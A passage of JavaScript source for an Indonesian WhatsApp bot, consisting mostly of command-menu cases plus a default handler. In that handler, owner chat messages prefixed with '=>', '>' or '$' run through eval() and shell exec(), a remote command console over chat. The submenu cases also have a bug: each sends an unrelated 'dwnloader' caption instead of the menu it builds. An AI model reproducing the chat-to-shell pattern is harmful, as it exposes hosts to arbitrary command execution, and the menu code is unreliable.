let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
gans.sendMessage(m.chat, { caption: `${dwnloader}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, nyoutube, quoted: ftroli})
}
break
case 'mphotooxy': {
potooxy = `╭──❍ *Photo Oxy Menu*
│
│⭔ ${prefix}shadow
│⭔ ${prefix}romantic
│⭔ ${prefix}smoke
│⭔ ${prefix}burnpapper
│⭔ ${prefix}naruto
│⭔ ${prefix}lovemsg
│⭔ ${prefix}grassmsg
│⭔ ${prefix}lovetext
│⭔ ${prefix}coffecup
│⭔ ${prefix}butterfly
│⭔ ${prefix}harrypotter
│⭔ ${prefix}retrolol
│
╰────❍`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
gans.sendMessage(m.chat, { caption: `${dwnloader}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, nyoutube, quoted: ftroli})
}
break
case 'mephoto': {
ehoto = `╭──❍ *Ephoto Menu*
│
│⭔ ${prefix}ffcover
│⭔ ${prefix}crossfire
│⭔ ${prefix}galaxy
│⭔ ${prefix}glass
│⭔ ${prefix}neon
│⭔ ${prefix}beach
│⭔ ${prefix}blackpink
│⭔ ${prefix}igcertificate
│⭔ ${prefix}ytcertificate
│
╰────❍`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
gans.sendMessage(m.chat, { caption: `${dwnloader}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, nyoutube, quoted: ftroli})
}
break
           case 'mfun': {
mun = `╭──❍ *Fun Menu*
│
│⭔ ${prefix}simih
│⭔ ${prefix}halah
│⭔ ${prefix}hilih
│⭔ ${prefix}huluh
│⭔ ${prefix}heleh
│⭔ ${prefix}holoh
│⭔ ${prefix}jadian
│⭔ ${prefix}jodohku
│⭔ ${prefix}apakah
│⭔ ${prefix}bisakah
│⭔ ${prefix}kapan
│⭔ ${prefix}slot
│⭔ ${prefix}delttt
│⭔ ${prefix}tictactoe
│⭔ ${prefix}family100
│⭔ ${prefix}tebak [option]
│⭔ ${prefix}math [mode]
│⭔ ${prefix}suitpvp [@tag]
│
╰────❍`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
gans.sendMessage(m.chat, { caption: `${dwnloader}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, nyoutube, quoted: ftroli})
}
break
case 'mprimbon': {
pimbon = `╭──❍ *Primbon Menu*
│
│⭔ ${prefix}nomorhoki
│⭔ ${prefix}artimimpi
│⭔ ${prefix}artinama
│⭔ ${prefix}ramaljodoh
│⭔ ${prefix}ramaljodohbali
│⭔ ${prefix}suamiistri
│⭔ ${prefix}ramalcinta
│⭔ ${prefix}cocoknama
│⭔ ${prefix}pasangan
│⭔ ${prefix}jadiannikah
│⭔ ${prefix}sifatusaha
│⭔ ${prefix}rezeki
│⭔ ${prefix}pekerjaan
│⭔ ${prefix}nasib
│⭔ ${prefix}penyakit
│⭔ ${prefix}tarot
│⭔ ${prefix}fengshui
│⭔ ${prefix}haribaik
│⭔ ${prefix}harisangar
│⭔ ${prefix}harisial
│⭔ ${prefix}nagahari
│⭔ ${prefix}arahrezeki
│⭔ ${prefix}peruntungan
│⭔ ${prefix}weton
│⭔ ${prefix}karakter
│⭔ ${prefix}keberuntungan
│⭔ ${prefix}memancing
│⭔ ${prefix}masasubur
│⭔ ${prefix}zodiak
│
╰────❍`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
gans.sendMessage(m.chat, { caption: `${dwnloader}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, nyoutube, quoted: ftroli})
}
break
case 'mconvert': {
cnvert = `╭──❍ *Convert Menu*
│
│⭔ ${prefix}attp
│⭔ ${prefix}ttp
│⭔ ${prefix}toimage
│⭔ ${prefix}removebg
│⭔ ${prefix}sticker
│⭔ ${prefix}emojimix
│⭔ ${prefix}emojimix2
│⭔ ${prefix}tovideo
│⭔ ${prefix}togif
│⭔ ${prefix}tourl
│⭔ ${prefix}tovn
│⭔ ${prefix}tomp3
│⭔ ${prefix}toaudio
│⭔ ${prefix}toqr
│⭔ ${prefix}ebinary
│⭔ ${prefix}dbinary
│⭔ ${prefix}styletext
│⭔ ${prefix}smeme
│
╰────❍`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
gans.sendMessage(m.chat, { caption: `${dwnloader}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, nyoutube, quoted: ftroli})
}
break
case 'mmain': {
min = `╭──❍ *Main Menu*
│
│⭔ ${prefix}ping
│⭔ ${prefix}owner
│⭔ ${prefix}report
│⭔ ${prefix}menu / ${prefix}help / ${prefix}?
│⭔ ${prefix}delete
│⭔ ${prefix}infochat
│⭔ ${prefix}quoted
│⭔ ${prefix}listpc
│⭔ ${prefix}listgc
│⭔ ${prefix}listonline
│⭔ ${prefix}speedtest
│⭔ ${prefix}menfes
│⭔ ${prefix}tinyurl [link]
│⭔ ${prefix}linkpoi [link]
│
╰────❍`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
gans.sendMessage(m.chat, { caption: `${dwnloader}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, nyoutube, quoted: ftroli})
}
break
case 'mdatabase': {
dtbase = `╭──❍ *Database Menu*
│
│⭔ ${prefix}setcmd
│⭔ ${prefix}listcmd
│⭔ ${prefix}delcmd
│⭔ ${prefix}lockcmd
│⭔ ${prefix}addmsg
│⭔ ${prefix}listmsg
│⭔ ${prefix}getmsg
│⭔ ${prefix}delmsg
│
╰────❍`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
gans.sendMessage(m.chat, { caption: `${dwnloader}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, nyoutube, quoted: ftroli})
}
break
case 'manonymous': {
aonymous = `╭──❍ *Anonymous Menu*
│
│⭔ ${prefix}anonymous
│⭔ ${prefix}menfess
│⭔ ${prefix}start
│⭔ ${prefix}next
│⭔ ${prefix}keluar
│
╰────❍`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
gans.sendMessage(m.chat, { caption: `${dwnloader}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, nyoutube, quoted: ftroli})
}
break
case 'mislamic': {
islmic = `╭──❍ *Islamic Menu*
│
│⭔ ${prefix}iqra
│⭔ ${prefix}hadist
│⭔ ${prefix}alquran
│⭔ ${prefix}juzamma
│⭔ ${prefix}tafsirsurah
│
╰────❍`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
gans.sendMessage(m.chat, { caption: `${dwnloader}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, nyoutube, quoted: ftroli})
}
break
case 'mvoice': {
vice = `╭──❍ *Voice Changer*
│
│⭔ ${prefix}bass
│⭔ ${prefix}blown
│⭔ ${prefix}deep
│⭔ ${prefix}earrape
│⭔ ${prefix}fast
│⭔ ${prefix}fat
│⭔ ${prefix}nightcore
│⭔ ${prefix}reverse
│⭔ ${prefix}robot
│⭔ ${prefix}slow
│⭔ ${prefix}tupai
│
╰────❍`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
gans.sendMessage(m.chat, { caption: `${dwnloader}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, nyoutube, quoted: ftroli})
}
break
case 'mowner': {
oner = `╭──❍ *Owner Menu*
│
│⭔ ${prefix}react [emoji]
│⭔ ${prefix}chat [option]
│⭔ ${prefix}join [link]
│⭔ ${prefix}leave
│⭔ ${prefix}block @user
│⭔ ${prefix}unblock @user
│⭔ ${prefix}bcgroup [text]
│⭔ ${prefix}bcall [text]
│⭔ ${prefix}setppbot [image]
│⭔ ${prefix}setexif
│⭔ ${prefix}setmenu [option]
│
╰────❍`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
gans.sendMessage(m.chat, { caption: `${dwnloader}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, nyoutube, quoted: ftroli})
}
break
case 'allmenu': {
            let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let ments = [ownernya, me, ini_mark]
    anu = ` *Hai Kak ${pushname} ${ucapanWaktu} Semoga Hari Mu Menyenangkan*

╔━═━⊱ *「 USER INFO」* ━═━⬣
┃ *ダ Nama: ${pushname}*
┃ *ダ Limit: ${isCreator ? 'Unlimited 👑' : `${db.data.users[m.sender].limit}`}*
┃ *ダ Tag: @${sender.split('@')[0]}*
┃ *ダ User: ${isPremium? 'Premium 👑' : 'Gratisan 🗿'}*
┃ *ダ Number : @${me.split('@')[0]}*
┃ *ダ Status : ${isCreator? "Owner 👑️":"User ⚔️"}*
┗━━━━━━━━━━━━━━⬣

╔━═━⊱ *「 BOT INFO」* ━═━⬣
┃ *冬 Nama Bot: ${botname}*
┃ *冬 Owner: @${ownernya.split('@')[0]}*
┃ *冬 Powered  : @${ini_mark.split('@')[0]}*
┃ *冬 Email : botdeff4@gmail.com*
┃ *冬 Lib : Baileys Multi Device*
┃ *冬 Prefix : Multi Prefix*
┃ *冬 Baterai : 100% ga dicas*
┃ *冬 Platfrom : Win32*
┃ *冬 Runtime : ${runtime(process.uptime())}*
┃ *冬 Calender : ${hariini}*
┗━━━━━━━━━━━━━━⬣

╭──❍ *Group Menu*
│
│⭔ ${prefix}linkgroup
│⭔ ${prefix}ephemeral [option]
│⭔ ${prefix}setppgc [image]
│⭔ ${prefix}setname [text]
│⭔ ${prefix}setdesc [text]
│⭔ ${prefix}group [option]
│⭔ ${prefix}editinfo [option]
│⭔ ${prefix}add @user
│⭔ ${prefix}kick @user
│⭔ ${prefix}hidetag [text]
│⭔ ${prefix}tagall [text]
│⭔ ${prefix}antilink [on/off]
│⭔ ${prefix}mute [on/off]
│⭔ ${prefix}promote @user
│⭔ ${prefix}demote @user
│⭔ ${prefix}vote [text]
│⭔ ${prefix}devote
│⭔ ${prefix}upvote
│⭔ ${prefix}cekvote
│⭔ ${prefix}hapusvote
│
╰────❍
╭──❍ *Webzone Menu*
│
│⭔ ${prefix}playstore
│⭔ ${prefix}gsmarena
│⭔ ${prefix}jadwalbioskop
│⭔ ${prefix}nowplayingbioskop
│⭔ ${prefix}aminio
│⭔ ${prefix}wattpad
│⭔ ${prefix}webtoons
│⭔ ${prefix}drakor
│
╰────❍
╭──❍ *Downloader Menu*
│
│⭔ ${prefix}tiktoknowm [url]
│⭔ ${prefix}tiktokwm [url]
│⭔ ${prefix}tiktokmp3 [url]
│⭔ ${prefix}instagram [url]
│⭔ ${prefix}twitter [url]
│⭔ ${prefix}twittermp3 [url]
│⭔ ${prefix}facebook [url]
│⭔ ${prefix}pinterestdl [url]
│⭔ ${prefix}ytmp3 [url]
│⭔ ${prefix}ytmp4 [url]
│⭔ ${prefix}getmusic [query]
│⭔ ${prefix}getvideo [query]
│⭔ ${prefix}umma [url]
│⭔ ${prefix}joox [query]
│⭔ ${prefix}soundcloud [url]
│
╰────❍
╭──❍ *Search Menu*
│
│⭔ ${prefix}play [query]
│⭔ ${prefix}yts [query]
│⭔ ${prefix}google [query]
│⭔ ${prefix}gimage [query]
│⭔ ${prefix}pinterest [query]
│⭔ ${prefix}wallpaper [query]
│⭔ ${prefix}wikimedia [query]
│⭔ ${prefix}ytsearch [query]
│⭔ ${prefix}ringtone [query]
│⭔ ${prefix}stalk [option] [query]
│
╰────❍
╭──❍ *Random Menu*
│
│⭔ ${prefix}gbtku
│⭔ ${prefix}coffe
│⭔ ${prefix}quotesanime
│⭔ ${prefix}motivasi
│⭔ ${prefix}dilanquote
│⭔ ${prefix}bucinquote
│⭔ ${prefix}katasenja
│⭔ ${prefix}puisi
│⭔ ${prefix}couple
│⭔ ${prefix}anime
│⭔ ${prefix}waifu
│
╰────❍
╭──❍ *Text Pro Menu*
│
│⭔ ${prefix}3dchristmas
│⭔ ${prefix}3ddeepsea
│⭔ ${prefix}americanflag
│⭔ ${prefix}3dscifi
│⭔ ${prefix}3drainbow
│⭔ ${prefix}3dwaterpipe
│⭔ ${prefix}halloweenskeleton
│⭔ ${prefix}sketch
│⭔ ${prefix}bluecircuit
│⭔ ${prefix}space
│⭔ ${prefix}metallic
│⭔ ${prefix}fiction
│⭔ ${prefix}greenhorror
│⭔ ${prefix}transformer
│⭔ ${prefix}berry
│⭔ ${prefix}thunder
│⭔ ${prefix}magma
│⭔ ${prefix}3dcrackedstone
│⭔ ${prefix}3dneonlight
│⭔ ${prefix}impressiveglitch
│⭔ ${prefix}naturalleaves
│⭔ ${prefix}fireworksparkle
│⭔ ${prefix}matrix
│⭔ ${prefix}dropwater
│⭔ ${prefix}harrypotter
│⭔ ${prefix}foggywindow
│⭔ ${prefix}neondevils
│⭔ ${prefix}christmasholiday
│⭔ ${prefix}3dgradient
│⭔ ${prefix}blackpink
│⭔ ${prefix}gluetext
│
╰────❍
╭──❍ *Photo Oxy Menu*
│
│⭔ ${prefix}shadow
│⭔ ${prefix}romantic
│⭔ ${prefix}smoke
│⭔ ${prefix}burnpapper
│⭔ ${prefix}naruto
│⭔ ${prefix}lovemsg
│⭔ ${prefix}grassmsg
│⭔ ${prefix}lovetext
│⭔ ${prefix}coffecup
│⭔ ${prefix}butterfly
│⭔ ${prefix}harrypotter
│⭔ ${prefix}retrolol
│
╰────❍
╭──❍ *Ephoto Menu*
│
│⭔ ${prefix}ffcover
│⭔ ${prefix}crossfire
│⭔ ${prefix}galaxy
│⭔ ${prefix}glass
│⭔ ${prefix}neon
│⭔ ${prefix}beach
│⭔ ${prefix}blackpink
│⭔ ${prefix}igcertificate
│⭔ ${prefix}ytcertificate
│
╰────❍
╭──❍ *Fun Menu*
│
│⭔ ${prefix}simih
│⭔ ${prefix}halah
│⭔ ${prefix}hilih
│⭔ ${prefix}huluh
│⭔ ${prefix}heleh
│⭔ ${prefix}holoh
│⭔ ${prefix}jadian
│⭔ ${prefix}jodohku
│⭔ ${prefix}apakah
│⭔ ${prefix}bisakah
│⭔ ${prefix}kapan
│⭔ ${prefix}slot
│⭔ ${prefix}delttt
│⭔ ${prefix}tictactoe
│⭔ ${prefix}family100
│⭔ ${prefix}tebak [option]
│⭔ ${prefix}math [mode]
│⭔ ${prefix}suitpvp [@tag]
│
╰────❍
╭──❍ *Primbon Menu*
│
│⭔ ${prefix}nomorhoki
│⭔ ${prefix}artimimpi
│⭔ ${prefix}artinama
│⭔ ${prefix}ramaljodoh
│⭔ ${prefix}ramaljodohbali
│⭔ ${prefix}suamiistri
│⭔ ${prefix}ramalcinta
│⭔ ${prefix}cocoknama
│⭔ ${prefix}pasangan
│⭔ ${prefix}jadiannikah
│⭔ ${prefix}sifatusaha
│⭔ ${prefix}rezeki
│⭔ ${prefix}pekerjaan
│⭔ ${prefix}nasib
│⭔ ${prefix}penyakit
│⭔ ${prefix}tarot
│⭔ ${prefix}fengshui
│⭔ ${prefix}haribaik
│⭔ ${prefix}harisangar
│⭔ ${prefix}harisial
│⭔ ${prefix}nagahari
│⭔ ${prefix}arahrezeki
│⭔ ${prefix}peruntungan
│⭔ ${prefix}weton
│⭔ ${prefix}karakter
│⭔ ${prefix}keberuntungan
│⭔ ${prefix}memancing
│⭔ ${prefix}masasubur
│⭔ ${prefix}zodiak
│
╰────❍
╭──❍ *Convert Menu*
│
│⭔ ${prefix}attp
│⭔ ${prefix}ttp
│⭔ ${prefix}toimage
│⭔ ${prefix}removebg
│⭔ ${prefix}sticker
│⭔ ${prefix}emojimix
│⭔ ${prefix}emojimix2
│⭔ ${prefix}tovideo
│⭔ ${prefix}togif
│⭔ ${prefix}tourl
│⭔ ${prefix}tovn
│⭔ ${prefix}tomp3
│⭔ ${prefix}toaudio
│⭔ ${prefix}toqr
│⭔ ${prefix}ebinary
│⭔ ${prefix}dbinary
│⭔ ${prefix}styletext
│⭔ ${prefix}smeme
│
╰────❍
╭──❍ *Main Menu*
│
│⭔ ${prefix}ping
│⭔ ${prefix}owner
│⭔ ${prefix}report
│⭔ ${prefix}menu / ${prefix}help / ${prefix}?
│⭔ ${prefix}delete
│⭔ ${prefix}infochat
│⭔ ${prefix}quoted
│⭔ ${prefix}listpc
│⭔ ${prefix}listgc
│⭔ ${prefix}listonline
│⭔ ${prefix}speedtest
│⭔ ${prefix}menfes 
│⭔ ${prefix}tinyurl [url]
│⭔ ${prefix}shrturl [url]
│
╰────❍
╭──❍ *Database Menu*
│
│⭔ ${prefix}setcmd
│⭔ ${prefix}listcmd
│⭔ ${prefix}delcmd
│⭔ ${prefix}lockcmd
│⭔ ${prefix}addmsg
│⭔ ${prefix}listmsg
│⭔ ${prefix}getmsg
│⭔ ${prefix}delmsg
│
╰────❍
╭──❍ *Anonymous Menu*
│
│⭔ ${prefix}anonymous
│⭔ ${prefix}menfess
│⭔ ${prefix}start
│⭔ ${prefix}next
│⭔ ${prefix}keluar
│
╰────❍
╭──❍ *Islamic Menu*
│
│⭔ ${prefix}iqra
│⭔ ${prefix}hadist
│⭔ ${prefix}alquran
│⭔ ${prefix}juzamma
│⭔ ${prefix}tafsirsurah
│
╰────❍
╭──❍ *Voice Changer*
│
│⭔ ${prefix}bass
│⭔ ${prefix}blown
│⭔ ${prefix}deep
│⭔ ${prefix}earrape
│⭔ ${prefix}fast
│⭔ ${prefix}fat
│⭔ ${prefix}nightcore
│⭔ ${prefix}reverse
│⭔ ${prefix}robot
│⭔ ${prefix}slow
│⭔ ${prefix}tupai
│
╰────❍
╭──❍ *Owner Menu*
│
│⭔ ${prefix}react [emoji]
│⭔ ${prefix}chat [option]
│⭔ ${prefix}join [link]
│⭔ ${prefix}leave
│⭔ ${prefix}block @user
│⭔ ${prefix}unblock @user
│⭔ ${prefix}bcgroup [text]
│⭔ ${prefix}bcall [text]
│⭔ ${prefix}setppbot [image]
│⭔ ${prefix}setexif
│⭔ ${prefix}setmenu [option]
│
╰────❍
_Donasi Ngab_\n_Jangan Ngarep Free Mulu_`
let buttons = [{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: '❗Rules' }, type: 1 }]
gans.sendMessage(m.chat, { caption: `${anu}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, footer: nyoutube, mentions: ments})
}
break

//Akhir Dari Case
default:
if (budy.startsWith('=>')) {
if (!isCreator) return m.reply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return m.reply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return m.reply(mess.owner)
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)
})
}
			
if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
        ...m.msg.contextInfo,
        forwardingScore: 0,
        isForwarded: true,
        participant: other
}
            } : {})
        }
return !0
}
			
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
gans.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
